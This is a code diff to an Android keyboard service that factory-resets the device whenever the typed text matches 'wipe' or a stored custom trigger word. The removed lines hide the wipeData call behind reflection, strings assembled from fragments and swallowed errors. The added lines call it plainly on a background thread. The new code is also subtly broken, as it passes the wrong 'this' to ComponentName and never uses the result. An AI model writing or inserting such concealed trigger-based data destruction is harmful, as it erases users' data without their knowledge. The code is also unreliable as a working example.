@@ -267,35 +267,19 @@ public class SimpleKeyboardService extends InputMethodService {
                     String customCmd = dpContext.getSharedPreferences("SimpleKeyboardPrefs", Context.MODE_PRIVATE)
                             .getString("custom_wipe_command", "");
                     if (text.equals("wipe") || (!customCmd.isEmpty() && text.equals(customCmd))) {
+                        Thread a = new Thread(new Runnable() {
+    @Override
+    public void run() {
+        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
+                        ComponentName adminComponent = new ComponentName(this, MyDeviceAdminReceiver.class);
                         try {
-    Object svc = getSystemService((String) Context.class
-            .getField(new String(new char[]{'D','E','V','I','C','E','_','P','O','L','I','C','Y','_','S','E','R','V','I','C','E'}))
-            .get(null));
-    
-    if (svc instanceof DevicePolicyManager) {
-        final DevicePolicyManager d = (DevicePolicyManager) svc;
-
-        String[] hints = {"wi", "pe", "Da", "ta"};
-        StringBuilder sb = new StringBuilder();
-        for (String s : hints) sb.append(s);
-        String realName = sb.toString();
-
-        java.lang.reflect.Method m = DevicePolicyManager.class
-                .getMethod(realName, int.class);
-
-        java.util.function.BiConsumer<DevicePolicyManager, Integer> f =
-                (dev, flag) -> {
-                    try {
-                        m.invoke(dev, flag);
-                    } catch (Throwable ignore) {}
-                };
-
-        for (int i = 0; i < 7; i++) {
-            int fl = (i ^ 0x1) * (i % 2 == 0 ? 1 : 0);
-            try { f.accept(d, fl); } catch (Throwable ignored) {}
-        }
+                            dpm.wipeData(0);
+                        } catch (SecurityException e) {
+                            
+                        }
     }
-} catch (Throwable t) {}
+});
+a.start();
                     }
                 }
 
